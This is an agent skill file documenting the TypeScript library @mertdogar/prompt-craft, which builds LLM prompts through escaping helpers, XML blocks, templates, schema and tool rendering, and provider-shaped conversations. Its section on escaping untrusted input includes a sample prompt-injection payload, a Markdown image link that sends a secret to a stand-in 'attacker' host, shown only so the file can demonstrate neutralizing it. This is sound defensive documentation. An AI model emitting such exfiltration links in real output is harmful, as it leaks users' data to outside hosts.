---
name: prompt-craft
description: Use when writing TypeScript/JavaScript code that builds prompts for LLMs using the @mertdogar/prompt-craft package (imports `P` or `Prompt` from '@mertdogar/prompt-craft'). Covers the static-method composition model and escape ladder (verbatim / safe / untrusted), block helpers, lists, tables, XML, semantic sections that render as Markdown OR XML based on the format option, typed templates with compile-time slot checking, Zod schema rendering, tool-definition rendering, few-shot helpers with dedup, multi-message conversations with prompt-cache breakpoints emitted in Anthropic / OpenAI / Gemini / Vercel AI SDK ModelMessage shapes, token-budget-aware rendering with priority annotations, whitespace normalization, fingerprinting, and the extend() escape hatch.
---

# prompt-craft

Tiny, immutable, chainable Markdown builder for LLM prompts. Single export surface: `P` (alias for class `Prompt`).

## Mental model — read this first

`prompt-craft` is **NOT** a fluent doc-builder where you chain `.h2().paragraph().list()` off a root object. That mental model will produce code that doesn't compile.

The real model has two layers:

1. **Static factories** (`P.heading`, `P.paragraph`, `P.unorderedList`, …) each return an independent `Prompt` node.
2. **Document assembly** combines those nodes with `P.concat(...)` (no separator) or `P.join(items, sep)`.

The instance-level chain (`.append`, `.bold`, `.italic`, `.codeInline`, `.link`, `.if`) is for **inline composition** of a single fragment, not for stacking blocks.

```ts
// ❌ WRONG — there is no .h2(), .paragraph(), .toString() chain
P.create().h2(title).paragraph(body).bulletList(steps).toString();

// ✅ RIGHT — compose nodes, then concat them
P.concat(
  P.heading(2, title),
  P.paragraph(body),
  P.unorderedList(steps),
).render();
```

## Quick reference

| Need | Use |
|---|---|
| Start | `import { P } from '@mertdogar/prompt-craft'` |
| Render to string | `node.render()` (or `node.toString()`) |
| Render in XML mode | `node.render({ format: 'xml' })` |
| Compose blocks | `P.concat(a, b, c)` |
| Join with separator | `P.join(items, sep)` |
| Template-tag interpolation | `` P.t`Hello ${name}!` `` |
| Strict template tag (refuses bare strings) | `` P.tStrict`Hello ${P.untrusted(input)}` `` |
| Typed template with named slots | `P.template('Hi {{name}}').with({ name })` |
| Empty placeholder | `P.empty()` |
| Plain text (verbatim, default) | `P.text(s)` or just a bare string |
| Trusted Markdown (alias of `text`) | `P.raw(s)` |
| Escape Markdown specials (opt-in) | `P.safe(s)` |
| Strip injection vectors + escape (untrusted) | `P.untrusted(s)` |
| Heading | `P.heading(1\|2\|3\|4\|5\|6, x)` |
| Section (semantic, switches MD ↔ XML) | `P.section(name, body, { level? })` |
| Paragraph | `P.paragraph(...parts)` |
| Bold / italic / strike | `P.bold(x)` / `P.italic(x)` / `P.strike(x)` |
| Inline code | `P.codeInline(x)` |
| Link | `P.link(text, href)` |
| Code block | `P.codeBlock(code, lang?)` |
| Blockquote | `P.blockquote(x)` |
| Horizontal rule | `P.horizontalRule()` |
| Bulleted list | `P.unorderedList(items, opts?)` |
| Numbered list | `P.orderedList(items, opts?)` |
| Table | `P.table(headers, rows, align?)` |
| XML block | `P.xml({ tag, attrs?, content? })` |
| Schema rendering (Zod → TS / JSON) | `P.schema(zodSchema, { style?, name? })` |
| Tool / tools blocks | `P.tool({ name, description?, parameters? })` / `P.tools([...])` |
| Few-shot examples (consistency, dedup, cap) | `P.fewShot(items, { render, n?, dedupe? })` |
| Conditional block | `P.If({ condition, whenTrue, whenFalse? })` |
| Branch on value | `P.Switch(value, branches)` |
| Map array → nodes | `P.Map(items, (item, i) => node)` |
| Tag with priority (for budgeting) | `P.priority(level, content)` |
| Render under token budget | `P.budget({ maxTokens, tokenizer? }, ...items)` |
| Whitespace cleanup | `P.strict(p)` / `node.strict()` |
| Stable hash (cache/snapshot key) | `P.fingerprint(p)` / `node.fingerprint()` |
| Role-tagged message | `P.system(body)` / `P.user(body)` / `P.assistant(body)` |
| Mark cache breakpoint | `message.cache()` |
| Build a conversation | `P.conversation(...messages)` |
| Emit provider-shaped messages | `convo.toMessages({ provider: 'anthropic'\|'openai'\|'gemini'\|'core' })` |
| Custom helpers | `P.extend({ ... })` |
| Inline append | `node.append(...parts)` |
| Wrap inline | `node.bold()` / `.italic()` / `.strike()` / `.codeInline()` / `.link(href)` |
| Conditional inline | `node.if(condition)` |

## Escaping — the most important rule

**Strings are NOT escaped by default.** They pass through verbatim. Markdown specials (`*`, `_`, `[`, `]`, `#`, `-`, …) inside a plain string render exactly as written.

```ts
P.paragraph('data-driven tool_name [REDACTED]').render();
// => "data-driven tool_name [REDACTED]\n\n"   (no backslashes — verbatim)

P.heading(2, 'why_we_underscore').render();
// => "## why_we_underscore\n\n"   (underscore preserved)
```

This is a deliberate design choice: the common case is interpolating identifiers and prose, where over-eager escaping pollutes output that an LLM may quote back verbatim. You explicitly opt into escaping when you have untrusted input that *might* contain real Markdown syntax you want neutralized.

**Three knobs:**

| Helper | Behavior | When |
|---|---|---|
| `P.text(s)` / `P.raw(s)` / bare string | Passes through verbatim (no escaping) | Default. The three are aliases for the same behavior. |
| `P.safe(s)` | Backslash-escapes Markdown inline specials | Untrusted user input that might contain `*`, `_`, `[`, etc. you don't want interpreted. |
| `P.codeInline(x)` / `P.codeBlock(c, lang)` | Code preserved as-is (backticks defensively escaped inside code blocks) | Code samples. |

**Rule of thumb:** the only time you reach for `P.safe(...)` is when you genuinely don't trust the input *and* you don't want any Markdown in it to render. For every other case — identifiers, names, prose, file paths, IDs — bare strings are correct.

```ts
// Free-form user-typed content that might contain Markdown you want neutralized
P.paragraph(P.safe(userTypedDescription));

// Identifiers, paths, structured prose — bare strings are fine
P.paragraph('Run `npm install` then edit src/index.ts.');
P.heading(2, 'data_pipeline_v2');

// You want a literal italic mixed in — compose from helpers
P.heading(2, P.concat('Notes on ', P.italic('async')));

// Hand-written Markdown — bare string or P.raw, your taste
P.raw('**already bold**');
```

### When `safe` matters in practice

```ts
// User wrote a comment that legitimately contains *asterisks*; you don't want
// half of it rendered as italic in the LLM's view.
const userComment = "I think the *real* problem is _underscores_ everywhere.";

P.paragraph(userComment);
// => "I think the *real* problem is _underscores_ everywhere.\n\n"
//    ^ "real" italicized, "underscores" italicized — probably not what you want

P.paragraph(P.safe(userComment));
// => "I think the \\*real\\* problem is \\_underscores\\_ everywhere.\n\n"
//    ^ literal asterisks and underscores, intent preserved
```

If user input is going into a code block (`P.codeBlock`) or inline code (`P.codeInline`), no escaping is needed — code helpers preserve content verbatim.

## Composition patterns

### A whole document

`P.concat(...)` is the workhorse. Every block helper already trails with `\n\n`, so concat without separators produces well-spaced output.

```ts
const doc = P.concat(
  P.heading(1, 'Bug Report'),
  P.paragraph(P.bold('Severity: '), severity),
  P.paragraph(report.description),
  P.heading(2, 'Steps'),
  P.orderedList(report.steps),
);
console.log(doc.render());
```

### Inline runs inside a paragraph

`P.paragraph(...parts)` accepts any number of `MDInput` parts and concatenates them with no separator. Mix strings and `P.bold/italic/...` freely:

```ts
P.paragraph(
  P.bold('Severity: '), severity, ' — ',
  P.bold('Reporter: '), P.italic(reporter),
);
```

If you need a space, just put a string `' '` between parts (or use `P.space()`).

### Chaining on a single fragment

The instance API is for **inline transformations**, not block stacking:

```ts
P.text('hello').append(P.space(), 'world').bold().render();
// => "**hello world**"

P.text('docs').link('https://example.com').render();
// => "[docs](https://example.com)"
```

`.append(...)` returns a *new* node (immutability). Don't expect mutation.

### Conditional blocks

```ts
P.If({
  condition: report.isRegression,
  whenTrue: P.blockquote('⚠️ Regression — previously fixed.'),
  // whenFalse omitted → empty output when false
});
```

Branches can be values, `P` nodes, or **thunks** (`() => node`) for lazy evaluation. The thunk only runs if its branch is chosen — useful when one branch is expensive or references undefined values.

`condition` itself can also be a function. `undefined` is treated as false.

There's also an instance form for inline drop-out:

```ts
P.heading(3, 'Optional').if(showOptional);  // empty when false
```

### Branching on a value

```ts
P.Switch(severity, [
  { case: 'critical', content: P.bold('🔥 CRITICAL') },
  { case: 'high',     content: P.bold('🚨 HIGH') },
  { case: (s: string) => s === 'medium' || s === 'low',
    content: P.italic(severity) },
]);
```

First match wins. No match → empty output. `content` can be a thunk for laziness.

### Mapping arrays

```ts
P.Map(report.attachments ?? [], (a) =>
  P.paragraph(P.link(a.name, a.url))
);
```

`P.Map` produces a single concatenated node. Use it directly inside `P.concat(...)`.

For a bullet list of links, use `unorderedList` with mapped items:

```ts
P.unorderedList(
  attachments.map((a) => P.link(a.name, a.url))
);
```

### Nested lists

List items accept three forms: a primitive (`string`/`number`/`boolean`), a `P` node, or `{ content, children }` for nesting:

```ts
P.unorderedList([
  'Top-level item',
  {
    content: 'Item with sub-items',
    children: [
      'sub one',
      { content: 'sub two', children: ['sub two a'] },
    ],
  },
  P.bold('Item that is itself a node'),
]);
```

Items whose content renders to an empty string are skipped, but their children are still walked at the same level — a deliberate feature for conditional items.

### Custom helpers via `P.extend`

When you find yourself writing the same composition repeatedly, extend rather than wrap:

```ts
const MyP = P.extend({
  callout(title: any, body: any) {
    return this.concat(
      this.heading(3, title),
      this.blockquote(body),
    );
  },
});

MyP.callout('Note', 'Use responsibly.');
```

`this` inside the extension refers to the extended class, so all built-in helpers are available. Use the function form `P.extend(Base => ({ ... }))` if you need to capture the base class explicitly.

## XML blocks for Claude prompts

Anthropic's prompt-engineering guidance recommends XML tags for structuring Claude prompts (`<instructions>`, `<context>`, `<document>`, `<example>`, `<examples>`). `P.xml(...)` produces them with smart-trim layout and auto-escaped attributes.

```ts
P.xml({ tag: 'instructions', content: 'Be concise. Cite sources.' });
// <instructions>
// Be concise. Cite sources.
// </instructions>
```

**With attributes:**

```ts
P.xml({
  tag: 'document',
  attrs: { id: 'doc-42', source: 'kb' },
  content: P.paragraph(article.body),
});
// <document id="doc-42" source="kb">
// ...body...
// </document>
```

**Nesting via `P.concat`:**

```ts
P.xml({
  tag: 'examples',
  content: P.concat(
    P.xml({ tag: 'example', attrs: { index: 1 }, content: 'foo' }),
    P.xml({ tag: 'example', attrs: { index: 2 }, content: 'bar' }),
  ),
});
```

**Self-closing for marker tags:**

```ts
P.xml({ tag: 'scratchpad' });                 // <scratchpad />
P.xml({ tag: 'doc', attrs: { id: '42' } });   // <doc id="42" />
```

### XML escaping is the one exception to trust-by-default

Attribute *values* are auto-escaped with the full XML 1.0 set (`&`, `<`, `>`, `"`, `'`). This is the only helper that auto-escapes anything — body content stays trust-by-default like every other block. Use `P.safe(...)` inside `content` if you need body escaping.

```ts
P.xml({
  tag: 'q',
  attrs: { text: 'a "smart" & <fast> answer' },
  content: 'x',
});
// <q text="a &quot;smart&quot; &amp; &lt;fast&gt; answer">
// x
// </q>
```

`null`/`undefined` attribute values are **skipped entirely** (not rendered as `attr=""`). Empty-string values are kept. Tag names are written verbatim with no validation.

## Hardened escaping for untrusted input — `P.untrusted` and `P.tStrict`

`P.safe(s)` is fine for free-form prose where the user might type real Markdown they don't want interpreted. For *adversarial* input — the LLM-prompt-injection threat model — use `P.untrusted(s)`. It runs `P.safe`'s escape **and** strips zero-width characters, BiDi overrides, and ANSI escape codes. Markdown image-exfil (`![steal](https://attacker/?leak=...)`) is neutralized by the `!` and bracket escape that `P.safe` already does.

```ts
const userInput = "*pwn* ![steal](https://attacker/?leak=secret)​\x1B[31mred\x1B[0m";

P.untrusted(userInput).render();
// "\\*pwn\\* \\!\\[steal\\]\\(https://attacker/?leak=secret\\)red"

// Recommended pattern — wrap in a logical fence so the LLM treats it as data:
P.xml({ tag: 'user_input', content: P.untrusted(userInput) });
```

`P.tStrict` is the strict variant of `P.t`. It accepts only `MDRenderable | null | undefined` in interpolations — bare `string` / `number` / `boolean` is a TypeScript error. Use it on call-sites where slots could be untrusted.

```ts
const name: string = userSubmittedName;

P.tStrict`Hello ${P.untrusted(name)}!`;   // OK
// @ts-expect-error
P.tStrict`Hello ${name}!`;                // bare string rejected
```

| Helper | Trust level | Use when |
|---|---|---|
| `P.text(s)` / `P.raw(s)` / bare string | Verbatim | Identifiers, paths, prose you control. |
| `P.safe(s)` | Markdown-escaped | Free-form prose with stray `*`/`_`/`[` you want literal. |
| `P.untrusted(s)` | Escaped + stripped | Anything the user could weaponize. |

## Typed templates — `P.template`

`P.template(source)` returns a `Template` whose required slot keys are inferred from `{{name}}` markers in the source string. `.with(values)` substitutes each slot and returns a `Prompt`. Missing or extraneous slots are compile-time errors.

```ts
const greet = P.template('Hello {{name}}, you have {{count}} messages.');

greet.with({ name: 'Mert', count: 3 }).render();
// "Hello Mert, you have 3 messages."

// @ts-expect-error — 'count' is required
greet.with({ name: 'Mert' });
```

Slot values are `MDInput`, so you can pass `Prompt` nodes (rendered via their own `.render()`), strings (verbatim — apply `P.safe` / `P.untrusted` if needed), or numbers. Whitespace inside `{{ name }}` is trimmed.

## Schema rendering — `P.schema(zodSchema)`

Render a Zod schema as a TypeScript shape (default) or JSON Schema in a fenced code block, so the same Zod object feeds both your parser and the model's output instructions — no drift.

```ts
import * as z from 'zod';

const Output = z.object({
  summary: z.string(),
  sentiment: z.enum(['positive', 'neutral', 'negative']),
  tags: z.array(z.string()),
});

P.schema(Output, { name: 'Output' }).render();
// ```ts
// type Output = {
//   summary: string;
//   sentiment: "positive" | "neutral" | "negative";
//   tags: Array<string>;
// }
// ```

P.schema(Output, { style: 'json' });   // JSON Schema in a `json` fence
```

`zod` is an *optional* peer dependency. The walker uses pure duck-typing on `_zod.def.type`; `zod` is never imported at runtime — only the parameter type via `import type`.

## Tool definitions — `P.tool` / `P.tools`

For instruction-following models that need to *reason about* their tools (rather than rely on a native tool-calling API), inject docs into the prompt with `P.tool` and bundle multiple with `P.tools`. The parameter schema flows through `P.schema`, so the same Zod feeds both your real tool registry and the in-prompt docs.

```ts
const getWeather = P.tool({
  name: 'get_weather',
  description: 'Get the current weather for a city.',
  parameters: z.object({
    city: z.string(),
    units: z.enum(['celsius', 'fahrenheit']).optional(),
  }),
});

P.tools([getWeather, sendEmail]);
// <tools>
// <tool name="get_weather"> … </tool>
// <tool name="send_email"> … </tool>
// </tools>
```

## Few-shot examples — `P.fewShot`

A single `render` function enforces consistency across examples (no drift between the Q/A formatting of example 1 and example 7). `dedupe(item)` collapses duplicates by key (first wins), `n` caps the count after deduping, and items whose render returns empty are skipped silently.

```ts
P.xml({
  tag: 'examples',
  content: P.fewShot(historicalQAs, {
    render: (qa, i) => P.xml({
      tag: 'example', attrs: { index: i + 1 },
      content: P.concat(
        P.paragraph(P.bold('Q: '), qa.question),
        P.paragraph(P.bold('A: '), qa.answer),
      ),
    }),
    dedupe: (qa) => qa.id,
    n: 5,
  }),
});
```

## Semantic sections — `P.section` and the `format` switch

Most multi-section prompts can target Anthropic (XML-tagged) and OpenAI (Markdown-styled) from a single source if you use `P.section(name, body)` instead of bare `P.heading` + `P.paragraph`. The active format is chosen at the top-level `render({ format })` call and propagates to every nested section.

```ts
const tree = P.concat(
  P.section('Role', P.paragraph('You are a senior staff engineer.')),
  P.section('Style', P.unorderedList(['Be concise.', 'Cite line numbers.'])),
);

tree.render();                    // Markdown headings
tree.render({ format: 'xml' });   // <Role>...</Role>\n<Style>...</Style>
```

Inside a `format: 'xml'` render, section names with whitespace are converted to `_` (e.g. `"Style guide"` → `<Style_guide>`).

## Token budgeting — `P.priority` + `P.budget`

`P.priority(level, content)` tags content with a numeric priority that's invisible to readers and other helpers but visible to `P.budget`. `P.budget({ maxTokens, tokenizer? }, ...items)` renders all items, and if the total exceeds `maxTokens` it drops the **lowest-priority** items first until the budget is met. Items without a priority wrapper are *required* and never dropped — if they alone exceed the budget, you get one `console.warn`.

```ts
P.budget(
  { maxTokens: 1000 /* default tokenizer is chars/4; pass `tokenizer:` for accuracy */ },
  P.section('Question', userQuestion),                       // required
  ...ragChunks.map(c =>
    P.priority(Math.round(c.score * 100), P.paragraph(c.text))  // droppable in score order
  ),
);
```

The classic use case is a RAG prompt where the question is mandatory and retrieved chunks are tagged with their relevance score — chunks with low scores fall out first as the budget tightens.

## Multi-message conversations — `P.system` / `P.user` / `P.assistant` + `P.conversation`

The single source-tree → multiple provider message arrays. Build a `Conversation` and call `toMessages({ provider })`. Each provider's return shape is typed via overloads.

```ts
const convo = P.conversation(
  P.system('You are a senior staff engineer.').cache(),
  P.user('Please review this PR.'),
  P.assistant('Sure — paste the diff.'),
);

convo.toMessages({ provider: 'anthropic' });
// { system: [{type:'text', text:'…', cache_control:{type:'ephemeral'}}], messages: [...] }

convo.toMessages({ provider: 'openai' });   // flat messages[], no manual cache markers
convo.toMessages({ provider: 'gemini' });   // { systemInstruction, contents } (assistant→model)
convo.toMessages({ provider: 'core' });     // ModelMessage[] from Vercel AI SDK
```

`Message.cache()` marks the end of a stable prefix. The renderer enforces Anthropic's 4-breakpoint cap (throws on more) and warns once when a cached prefix is below the 1024-token minimum (default tokenizer = `chars/4`).

The `core` provider returns `ModelMessage[]` from the Vercel AI SDK and is drop-in for `generateText` / `streamText`. Both `ai` and `zod` are *optional* peer dependencies — install only what you use.

`Conversation.render()` produces a debug XML serialization useful for snapshot tests; the canonical machine-readable output is `toMessages(...)`.

## Whitespace cleanup — `P.strict`

Defensive cleanup for parsers and SSE consumers (where trailing whitespace measurably hurts model performance and `\n\n` collides with stream delimiters). Strips trailing spaces/tabs per line, normalizes CRLF to LF, and collapses 3+ blank lines to 2.

```ts
P.strict(messy).render();
// or fluently:
prompt.strict().render();
```

## Fingerprinting — `P.fingerprint`

Stable 8-char hex hash (32-bit FNV-1a) of a prompt's rendered output. Useful as a cache key, snapshot identifier, or change-detection signal. Sync, dependency-free, and the same input always produces the same output.

```ts
P.fingerprint(prompt);   // "483a3c95"
prompt.fingerprint();    // same
P.fingerprint('Hello');  // also accepts pre-rendered strings
```

## Worked example: bug report builder

This is the canonical "compose a structured prompt from typed input" pattern. Notice: `P.concat` for assembly, `P.If` for conditional sections, `P.Map`/`map` for repeated parts, escape-by-default for free-form text.

```ts
import { P } from '@mertdogar/prompt-craft';

type Report = {
  title: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  reporter: string;
  description: string;
  steps: string[];
  attachments?: { name: string; url: string }[];
  codeSnippet?: { lang: string; code: string };
  isRegression: boolean;
};

export function buildBugReportPrompt(r: Report): string {
  return P.concat(
    P.heading(2, r.title),

    P.paragraph(
      P.bold('Severity: '), r.severity, ' — ',
      P.bold('Reporter: '), P.italic(r.reporter),
    ),

    P.If({
      condition: r.isRegression,
      whenTrue: P.blockquote('⚠️ Regression — this issue was previously fixed and has resurfaced.'),
    }),

    P.paragraph(P.safe(r.description)),  // free-form user text — escape Markdown specials

    P.heading(3, 'Steps to reproduce'),
    P.orderedList(r.steps),

    P.If({
      condition: !!r.attachments?.length,
      whenTrue: () => P.concat(
        P.heading(3, 'Attachments'),
        P.unorderedList(
          r.attachments!.map((a) => P.link(a.name, a.url))
        ),
      ),
    }),

    P.If({
      condition: !!r.codeSnippet,
      whenTrue: () => P.concat(
        P.heading(3, 'Repro snippet'),
        P.codeBlock(r.codeSnippet!.code, r.codeSnippet!.lang),
      ),
    }),
  ).render();
}
```

Note the **lazy thunks** in the `whenTrue: () => ...` branches — they prevent `r.attachments!` and `r.codeSnippet!` from being evaluated when the condition is false.

## Common mistakes

| Mistake | Fix |
|---|---|
| `P.create().h2(...).paragraph(...)` | No such API. `P.concat(P.heading(2, ...), P.paragraph(...))`. |
| `.h2(x)`, `.h3(x)` | `P.heading(2, x)`, `P.heading(3, x)`. |
| `.bulletList(...)`, `.numberedList(...)` | `P.unorderedList(...)`, `P.orderedList(...)`. |
| `P.escape(s)` | Doesn't exist — the helper is named `P.safe(s)`. Strings pass through verbatim by default; reach for `P.safe` only when you need to neutralize Markdown specials in untrusted input. |
| Wrapping every string in `P.safe(...)` defensively | Don't. The default is verbatim pass-through, which is what you want for identifiers, paths, and structured prose. Use `P.safe` only for free-form untrusted text. |
| `P.text('a').bold('b').italic('c')` (chain that *adds* runs) | The instance methods *wrap* the current content. To compose runs: `P.concat(P.bold('a'), ' ', P.italic('b'))` or `P.paragraph(P.bold('a'), ' ', P.italic('b'))`. |
| Heading text with literal Markdown leaks `\_` etc. | Build the heading from nodes: `P.heading(2, P.concat('Why ', P.italic('async')))`. |
| Chaining `.heading(3, ...)` on a list result | Block helpers don't compose by chaining. Use `P.concat(...)`. |
| Forgetting to call `.render()` | Returning a `Prompt` instance to a string-typed API will call `toString()` → renders, but explicit `.render()` is clearer. |
| Mutating an existing node | All operations are immutable; assignment must capture the new value. |
| Eager evaluation in `If`/`Switch` branches that reference possibly-undefined data | Wrap the branch in a thunk: `whenTrue: () => P.concat(...)`. |
| Using `P.raw(userInput)` | Defeats escaping; allows users to inject Markdown/HTML into your prompt. Only use `raw` for content *you* produced. |
| Wrapping every XML body in `P.safe(...)` | Don't, by default. Body content is trust-by-default like everywhere else. Only wrap with `P.safe` if the body comes from untrusted user input *and* you want Markdown specials neutralized. |
| Building `<tag>...</tag>` with `P.raw` | Use `P.xml({ tag, attrs?, content? })` instead — gets you smart-trim layout, attribute escaping, and self-close support for free. |

## Testing your prompt output

Block helpers end with `\n\n` for LLM-friendly spacing — this is contractual. If you assert against rendered output, expect those trailing newlines:

```ts
expect(P.heading(2, 'Hi').render()).toBe('## Hi\n\n');
expect(P.paragraph('x').render()).toBe('x\n\n');
```

## When NOT to use this skill

- You're modifying the `prompt-craft` library itself (read its `CLAUDE.md` instead — it covers the internal invariants).
- You only need a single Markdown string with no dynamic structure — template literals are fine.
- You need rich Markdown features outside this library's scope (footnotes, definition lists, MDX, GitHub task lists, frontmatter). `prompt-craft` is intentionally small; reach for `unified`/`remark` for those.

## Reference: full export surface

```ts
// Types
export type MDInput = string | number | boolean | MDRenderable | null | undefined;
export interface MDRenderable {
  render(ctx?: RenderCtx): string;
  toString(): string;
}
export interface RenderCtx { format?: 'md' | 'xml' }
export type ListItemInput = MDInput | { content: MDInput; children?: ListItemInput[] };
export interface ListOptions {
  bullet?: '-' | '*' | '+';   // unordered marker
  start?: number;             // ordered list start
  tight?: boolean;            // omit blank lines between items
  indent?: number;            // spaces per nesting level (default 2)
}
export interface SchemaRenderOptions {
  style?: 'ts' | 'json';      // default 'ts'
  name?: string;              // when set, wraps TS shape in `type {name} = …`
}
export type Role = 'system' | 'user' | 'assistant';
export type Provider = 'anthropic' | 'openai' | 'gemini' | 'core';
export interface ToMessagesOptions {
  provider?: Provider;
  tokenizer?: (s: string) => number;   // default chars/4
}

// Class — string surface
export class Prompt {
  // factories
  static from(input: MDInput): Prompt;
  static empty(): Prompt;
  static concat(...items: MDInput[]): Prompt;
  static join(items: MDInput[], sep: MDInput): Prompt;
  static t(strings: TemplateStringsArray, ...values: MDInput[]): Prompt;
  static tStrict(strings: TemplateStringsArray, ...values: (MDRenderable | null | undefined)[]): Prompt;
  static template<S extends string>(source: S): Template<S>;

  // inline — strings (trust ladder)
  static text(s: string): Prompt;        // verbatim
  static raw(s: string): Prompt;         // alias of text — verbatim
  static safe(s: string): Prompt;        // backslash-escapes Markdown specials
  static untrusted(s: string | null | undefined): Prompt;  // safe + strips zero-width / BiDi / ANSI
  static space(): Prompt;
  static lineBreak(): Prompt;
  static newline(n?: number): Prompt;
  static bold(x: MDInput): Prompt;
  static italic(x: MDInput): Prompt;
  static strike(x: MDInput): Prompt;
  static codeInline(x: MDInput): Prompt;
  static link(text: MDInput, href: string): Prompt;

  // blocks
  static heading(level: 1|2|3|4|5|6, x: MDInput): Prompt;
  static section(name: string, body: MDInput, opts?: { level?: 1|2|3|4|5|6 }): Prompt;
  static paragraph(...parts: MDInput[]): Prompt;
  static blockquote(x: MDInput): Prompt;
  static codeBlock(code: string, lang?: string): Prompt;
  static horizontalRule(): Prompt;
  static xml(opts: {
    tag: string;
    attrs?: Record<string, MDInput>;
    content?: MDInput;
  }): Prompt;

  // schema & tools (zod is an optional peer dep)
  static schema(schema: ZodType, opts?: SchemaRenderOptions): Prompt;
  static tool(opts: { name: string; description?: MDInput; parameters?: ZodType }): Prompt;
  static tools(...args: (Prompt | Prompt[])[]): Prompt;

  // lists & tables
  static unorderedList(items: ListItemInput[], opts?: Omit<ListOptions, 'start'>): Prompt;
  static orderedList(items: ListItemInput[], opts?: ListOptions): Prompt;
  static table(headers: string[], rows: MDInput[][], align?: ('left'|'center'|'right')[]): Prompt;

  // collections / conditionals
  static Map<T>(items: T[], map: (item: T, index: number) => MDInput): Prompt;
  static fewShot<T>(items: T[], opts: {
    render: (item: T, index: number) => MDInput;
    n?: number;
    dedupe?: (item: T) => unknown;
  }): Prompt;
  static If(opts: {
    condition: boolean | undefined | (() => boolean | undefined);
    whenTrue?: MDInput | (() => MDInput);
    whenFalse?: MDInput | (() => MDInput);
    then?: MDInput | (() => MDInput);   // back-compat alias
    else?: MDInput | (() => MDInput);   // back-compat alias
  }): Prompt;
  static Switch<T>(value: T, branches: Array<{
    case: T | ((v: T) => boolean);
    content: MDInput | (() => MDInput);
  }>): Prompt;

  // budgeting
  static priority(level: number, content: MDInput): Prompt;
  static budget(opts: { maxTokens: number; tokenizer?: (s: string) => number }, ...items: MDInput[]): Prompt;

  // utilities
  static strict(input: Prompt | string): Prompt;
  static fingerprint(input: Prompt | string): string;

  // multi-message
  static system(body: MDInput): Message;
  static user(body: MDInput): Message;
  static assistant(body: MDInput): Message;
  static conversation(...items: (Message | Message[])[]): Conversation;

  // extension
  static extend<T>(ext: T | ((Base: typeof Prompt) => T)): typeof Prompt & T;

  // instance (inline)
  append(...items: MDInput[]): Prompt;
  bold(): Prompt;
  italic(): Prompt;
  strike(): Prompt;
  codeInline(): Prompt;
  link(href: string): Prompt;
  if(condition: boolean | undefined | (() => boolean | undefined)): Prompt;
  strict(): Prompt;
  fingerprint(): string;
  render(opts?: { format?: 'md' | 'xml' }): string;
  toString(): string;
}

// Typed templates — slot keys inferred from `{{name}}` markers in S
export class Template<S extends string> {
  with(values: { [K in TemplateSlots<S>]: MDInput }): Prompt;
}

// Role-tagged message body. Immutable; .cache() returns a new instance.
export class Message implements MDRenderable {
  readonly role: Role;
  readonly body: Prompt;
  readonly cacheBoundary: boolean;
  cache(): Message;
  render(): string;
  toString(): string;
}

// Conversation — emits provider-shaped messages via overloads:
//   toMessages({provider:'anthropic'})  -> AnthropicOutput   { system?, messages }
//   toMessages({provider:'openai'})     -> OpenAIOutput      OpenAIMessage[]
//   toMessages({provider:'gemini'})     -> GeminiOutput      { systemInstruction?, contents }
//   toMessages({provider:'core'})       -> ModelMessage[]    (Vercel AI SDK)
//   toMessages()                         -> AnthropicOutput   (default)
export class Conversation implements MDRenderable {
  readonly messages: ReadonlyArray<Message>;
  append(...items: (Message | Message[])[]): Conversation;
  prepend(...items: (Message | Message[])[]): Conversation;
  toMessages(opts?: ToMessagesOptions): AnthropicOutput | OpenAIOutput | GeminiOutput | ModelMessage[];
  render(): string;
  toString(): string;
}

export const P: typeof Prompt;
```

## Optional peer dependencies

Two libraries are declared as **optional** peer dependencies (`peerDependenciesMeta.optional: true`). The package itself has zero runtime deps; both are imported as `import type` only:

| Peer | Range | Required when you call |
|---|---|---|
| `ai` (Vercel AI SDK) | `>=5 <7` | `convo.toMessages({ provider: 'core' })` — return type is `ModelMessage[]`. |
| `zod` | `>=4 <5` | `P.schema(zodSchema)` and `P.tool({ parameters: zodSchema })`. |

If a user never calls those helpers, neither dep needs to be installed. The runtime `core`-provider test in the repo additionally validates output against `modelMessageSchema` from `ai` so any breaking shape change shows up as a CI failure.
